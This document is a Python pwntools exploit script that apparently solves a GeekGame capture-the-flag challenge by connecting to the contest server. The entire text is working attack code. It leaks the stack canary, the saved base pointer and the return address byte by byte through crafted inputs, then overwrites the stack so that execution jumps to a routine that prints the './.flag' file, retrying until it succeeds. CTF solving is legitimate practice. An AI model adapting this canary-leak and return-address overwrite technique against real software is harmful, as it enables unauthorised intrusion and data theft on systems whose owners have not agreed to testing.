from pwn import *

while True:
    token = b''
    r = remote('prob12.geekgame.pku.edu.cn', 10012)
    r.sendlineafter(b'Please input your token: ', token)

    def getXY(m):
        for y in range(20):
            if (128 + y - 2 * ((y // 2) // 2) - m - 2 * (y // 2)) % 3 == 0:
                break
        x = (128 + y - 2 * ((y // 2) // 2) - m - 2 * (y // 2)) // 3
        return x, y

    # return next Case #
    def submit(bytes):
        r.sendline(bytes)
        r.recvline()
        return int(r.recvline().decode()[6:-2])

    try:
        r.recvline()
        r.recvline()  # Case #0:

        # pull forward Canary and $rbp
        for m in range(7, -1, -1):
            x, y = getXY(m)
            submit(b'\\' * 127)
            submit(b'a' * x + b'\\' * y + b'a' * m + b'\\' * 5)
            submit(b'\\' * 128)

        canary_rbp = [0]  # Canary starts with 00
        # read Canary and $rbp byte by byte
        for _ in range(15):
            x, y = getXY(1)
            submit(b'\\' * 127)
            # [ becomes \ after inc ctx.id
            c = submit(b'a' * x + b'\\' * y + b'[' + b'\\')
            c = c if c > 0 else (c + 2 ** 32)  # to unsigned
            canary_rbp.append((c >> 16) & 0xff)
            submit(b'\\' * 128)

        rbp = 0
        for b in reversed(canary_rbp[8:]):
            rbp = (rbp << 8) + b
        rbp = rbp + 0x40  # get correct $rbp in print_flag
        save_rbp = rbp
        for i in range(8, 16):
            canary_rbp[i] = rbp & 0xff
            rbp = rbp >> 8

        # pull forward return address
        for m in range(22, -1, -1):
            x, y = getXY(m)
            submit(b'\\' * 127)
            submit(b'a' * x + b'\\' * y + b'a' * m + b'\\' * 5)
            submit(b'\\' * 128)

        ret_addr = []
        # read return address byte by byte
        for _ in range(8):
            x, y = getXY(1)
            submit(b'\\' * 127)
            c = submit(b'a' * x + b'\\' * y + b'[' + b'\\')
            c = c if c > 0 else (c + 2 ** 32)  # to unsigned
            ret_addr.append((c >> 16) & 0xff)
            submit(b'\\' * 128)

        ret = 0
        for b in reversed(ret_addr):
            ret = (ret << 8) + b
        ret = ret + 0x4c5 - 0x57f  # get expected return address
        ret_addr = []
        for _ in range(8):
            ret_addr.append(ret & 0xff)
            ret = ret >> 8

        # store ./.flag at $rbp-0x50, write the address to $rbp-0x48
        x, y = getXY(46)
        submit(b'\\' * 127)
        submit(b'a' * x + b'\\' * y + b'a' * 40 +
               (save_rbp - 0x50).to_bytes(6, 'little') + b'\\')

        # write ./.flag
        x, y = getXY(39)
        submit(b'\\' * 127)
        submit(b'a' * x + b'\\' * y + b'a' * 32 +
               b'./.flag' + b'\\')

        # write a \x00
        x, y = getXY(31)
        submit(b'\\' * 127)
        submit(b'a' * x + b'\\' * y + b'a' * 31 + b'\\')

        # write expected return address
        x, y = getXY(30)
        submit(b'\\' * 127)
        submit(b'a' * x + b'\\' * y + b'a' * 24 +
               bytes(ret_addr[:6]) + b'\\')

        # write a \x00
        x, y = getXY(23)
        submit(b'\\' * 127)
        submit(b'a' * x + b'\\' * y + b'a' * 23 + b'\\')

        # write Canary and correct $rbp
        x, y = getXY(22)
        submit(b'\\' * 127)
        submit(b'a' * x + b'\\' * y + b'a' * 9 +
               bytes(canary_rbp[1:14]) + b'\\')

        # write a \x00
        x, y = getXY(8)
        submit(b'\\' * 127)
        submit(b'a' * x + b'\\' * y + b'a' * 8 + b'\\')

        r.sendline(b'quit')

        line = r.recvline()
        if b'flag' in line:
            print(line)
            exit(0)
    except:
        pass

    r.close()
    sleep(10)  # connection rate limit
